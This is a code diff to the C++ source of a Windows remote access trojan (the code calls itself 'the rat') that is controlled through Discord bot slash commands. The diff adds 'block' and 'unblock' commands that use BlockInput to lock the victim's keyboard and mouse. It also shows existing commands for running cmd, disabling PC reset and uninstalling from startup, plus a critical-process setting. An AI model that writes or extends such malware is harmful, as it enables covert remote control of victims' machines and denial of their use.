@@ -23,9 +23,9 @@ typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* Old
 
 
 //shit to change
-const long long int guildId = 534534534534; // serverid
+const long long int guildId = 1234323423423; // serverid
 const std::string BOT_TOKEN = "discord-token";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
-const bool autostart = true;
+const bool autostart = false;
 
 // creates channel at startup and defines functions
 void suspend(const std::string& processName);
@@ -446,6 +446,30 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         });
 
+    // block
+    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
+        if (event.command.get_command_name() == "block" && (event.command.channel_id == Channelid_CreateChannel))
+        {
+            event.reply("attempting to block input");
+            BlockInput(TRUE);
+        }
+        else {
+            std::cout << "not for me \n";
+        }
+        });
+        
+    // unblock
+    bot.on_slashcommand([](const dpp::slashcommand_t& event) {
+        if (event.command.get_command_name() == "unblock" && (event.command.channel_id == Channelid_CreateChannel))
+        {
+            event.reply("attempting to unblock input");
+            BlockInput(FALSE);
+        }
+        else {
+            std::cout << "not for me \n";
+        }
+        });
+
     // send all commands and stuff
     bot.on_ready([&bot, &isAdmin](const dpp::ready_t& event) {
         if (dpp::run_once<struct register_bot_commands>()) {
@@ -462,6 +486,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             bot.global_command_create(dpp::slashcommand("disablereset", "Disables ability to reset pc without a usb", bot.me.id));
             bot.global_command_create(dpp::slashcommand("enablereset", "Disables ability to reset pc without a usb", bot.me.id));
             bot.global_command_create(dpp::slashcommand("uninstall", "Uninstalls the rat (deosnt delete just removes from startup and kill)", bot.me.id));
+            bot.global_command_create(dpp::slashcommand("block", "Blocks computer keyboard and mouse input", bot.me.id));
+            bot.global_command_create(dpp::slashcommand("unblock", "unBlocks computer keyboard and mouse input from block command", bot.me.id));
 
             // stuff to create run command so you can input data type shit
             dpp::slashcommand runCommandslash("run", "Run a command in cmd", bot.me.id);
@@ -491,7 +517,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
             bot.message_create(dpp::message()
                 .set_channel_id(Channelid_CreateChannel)
-                .set_content("Session started Version: 1.0.2 Admin : " + std::to_string(isAdmin)));
+                .set_content("Session started Version: 1.0.3 Admin : " + std::to_string(isAdmin)));
         }
         });
 
